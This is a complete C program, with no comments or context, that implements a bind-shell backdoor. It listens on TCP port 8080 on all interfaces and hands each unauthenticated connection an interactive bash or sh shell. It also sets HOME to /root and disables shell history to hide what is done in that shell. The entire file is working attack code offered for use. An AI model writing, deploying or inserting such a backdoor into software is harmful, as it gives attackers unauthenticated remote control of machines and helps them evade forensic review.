
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>

#define BIND_PORT 8080

int main(void) {
    signal(SIGCHLD, SIG_DFL);
    signal(SIGPIPE, SIG_IGN);

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) return 1;

    int one = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(BIND_PORT);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(srv); return 1;
    }
    listen(srv, 5);

    for (;;) {
        int cli = accept(srv, NULL, NULL);
        if (cli < 0) {
            if (errno == EINTR) continue;
            break;
        }
        pid_t pid = fork();
        if (pid == 0) {
            close(srv);
            setsid();
            dup2(cli, STDIN_FILENO);
            dup2(cli, STDOUT_FILENO);
            dup2(cli, STDERR_FILENO);
            close(cli);
            static char s_bash[]   = "/bin/bash";
            static char s_sh[]     = "/bin/sh";
            static char s_i[]      = "-i";
            static char s_term[]   = "TERM=xterm-256color";
            static char s_path[]   = "PATH=/usr/local/sbin:/usr/local/bin"
                                     ":/usr/sbin:/usr/bin:/sbin:/bin";
            static char s_home[]   = "HOME=/root";
            static char s_hist[]   = "HISTFILE=/dev/null";
            static char s_histsz[] = "HISTSIZE=0";
            char *av_bash[] = { s_bash, s_i, NULL };
            char *av_sh[]   = { s_sh,   s_i, NULL };
            char *envp[]    = { s_term, s_path, s_home,
                                s_hist, s_histsz, NULL };
            execve(s_bash, av_bash, envp);
            execve(s_sh,   av_sh,   envp);
            _exit(1);
        }
        close(cli);
    }
    close(srv);
    return 0;
}
